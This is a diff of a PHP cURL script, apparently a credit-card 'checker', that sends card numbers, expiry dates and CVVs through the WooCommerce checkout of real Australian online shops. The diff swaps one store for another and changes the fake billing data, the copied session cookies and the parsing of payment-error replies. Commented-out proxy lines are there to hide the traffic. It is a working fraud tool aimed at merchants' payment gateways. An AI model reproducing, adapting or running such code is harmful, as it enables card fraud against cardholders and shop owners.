@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.genovese.com.au/wp-admin/admin-ajax.php?action=woocommerce_checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://ginginanddry.net.au/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -238,15 +238,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=l2883lrk54mpe8bgako9ttj653; woocommerce_recently_viewed=370; wp_woocommerce_session_f1026b68ad2463df8b4ff034c7d3ae71=eb2dabf7033cf452585d7eec27870fdb%7C%7C1594141857%7C%7C1594138257%7C%7Cc48d8af421b9ac4ce7a49bea1ed53d69; smarter-navigation[query]=%7B%22paged%22%3A%222%22%2C%22post_type%22%3A%22product%22%7D; smarter-navigation[url]=https%3A%2F%2Fwww.genovese.com.au%2Fshop%2Fpage%2F2%2F; smarter-navigation[title]=Products+Archive+-+Page+2+of+3+-+Genovese+Coffee; woocommerce_items_in_cart=1; woocommerce_cart_hash=316169fe2160ee3a58b6c49ffe217925',
-'origin: https://www.genovese.com.au',
-'referer: https://www.genovese.com.au/checkout/',
+'cookie: wpfront-notification-bar-landingpage=1; mailchimp_landing_site=https%3A%2F%2Fginginanddry.net.au%2F%3Fwc-ajax%3Dget_refreshed_fragments; woocommerce_items_in_cart=1; wp_woocommerce_session_8e83faf0a70e323ccef66f6553c0c86a=c1487aa6aff94ee52205600e77733658%7C%7C1594203829%7C%7C1594200229%7C%7C8bb4b29f44723f4ac5cd7fd0e66aa134; woocommerce_cart_hash=f28c1e0ea58d981659c5977932f912fc; mailchimp.cart.current_email=pubgkittu@gmail.com; mailchimp_user_email=pubgkittu%40gmail.com',
+'origin: https://ginginanddry.net.au',
+'referer: https://ginginanddry.net.au/checkout-2/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_country=AU&billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_email=pubgkittu%40gmail.com&billing_phone=%2B615182641524&account_password=&order_comments=&g-recaptcha-response=&shipping_method%5B0%5D=flat_rate&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&_wpnonce=e360934273&_wp_http_referer=%2Fwp-admin%2Fadmin-ajax.php');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=QLD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A2-1&payment_method=migs&migs_card_number='.$cc.'&migs_card_expiration_month='.$mes.'&migs_card_expiration_year=20'.$ano.'&migs_card_csc='.$cvv.'&woocommerce-process-checkout-nonce=ac4a76fa66&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -256,7 +256,7 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>Payment failed: ','<\/li>\n\t<\/ul>"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment error: ','\t\t<\/li>\n\t<\/ul>\n"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
